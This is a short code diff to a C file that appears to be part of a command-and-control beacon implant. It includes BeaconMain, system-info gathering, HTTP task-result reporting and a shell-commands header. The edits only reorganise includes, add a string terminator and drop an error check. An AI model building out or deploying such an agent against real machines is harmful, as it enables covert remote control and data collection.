@@ -7,10 +7,10 @@
 #include <windows.h>
 #include <stdio.h>
 #include "types.h"
-#include "sysinfo.h"
-#include "json.h"
-#include "http.h"
-#include "commands.h"
+#include "sysinfo/gather.h"
+#include "core/json.h"
+#include "comms/http.h"
+#include "commands/shell.h"
 
 // Variables globales
 static AgentInfo g_AgentInfo;
@@ -80,6 +80,7 @@ static int send_result(int task_id, const char* result, int success) {
     HttpResponse response;
 
     strncpy(taskResult.agent_id, g_AgentInfo.agent_id, sizeof(taskResult.agent_id) - 1);
+    taskResult.agent_id[sizeof(taskResult.agent_id) - 1] = '\0';
     taskResult.task_id = task_id;
     strncpy(taskResult.result, result, sizeof(taskResult.result) - 1);
     taskResult.result[sizeof(taskResult.result) - 1] = '\0';
@@ -114,12 +115,7 @@ void BeaconMain(void) {
         return;
     }
 
-    if (!get_system_info(&g_AgentInfo)) {
-        DEBUG_PRINT("Failed to get system info");
-        http_cleanup();
-        return;
-    }
-
+    get_system_info(&g_AgentInfo);  // Maintenant void
     DEBUG_PRINT("System info collected");
 
     while (g_Running && checkin_attempts < 5) {
